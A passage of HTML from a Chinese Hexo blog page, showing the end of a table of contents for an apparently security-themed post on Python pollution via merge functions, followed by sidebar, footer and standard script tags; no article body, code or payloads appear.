          第一次递归</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E9%80%92%E5%BD%92-2"><span class="toc-number">3.1.1.2.</span> <span class="toc-text">
          第二次递归</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AC%A1%E9%80%92%E5%BD%92-2"><span class="toc-number">3.1.1.3.</span> <span class="toc-text">
          第三次递归</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93-2"><span class="toc-number">3.1.1.4.</span> <span class="toc-text">
          污染</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%B2%E7%BB%8F%E5%8A%A0%E8%BD%BD%E6%A8%A1%E5%9D%97%E7%9A%84%E8%8E%B7%E5%8F%96"><span class="toc-number">3.2.</span> <span class="toc-text">
          已经加载模块的获取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%85%B3%E7%B3%BB%E7%AE%80%E5%8D%95"><span class="toc-number">3.2.1.</span> <span class="toc-text">
          加载关系简单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%85%B3%E7%B3%BB%E5%A4%8D%E6%9D%82"><span class="toc-number">3.2.2.</span> <span class="toc-text">
          加载关系复杂</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sys%E6%A8%A1%E5%9D%97"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">
          sys模块</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%85%B3%E7%B3%BB%E5%A4%8D%E6%9D%82%E7%9A%84%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.3.</span> <span class="toc-text">
          加载关系复杂的实际利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84%E5%90%88%E5%B9%B6%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">
          实际环境下的合并函数</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">100</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.2</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Views</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>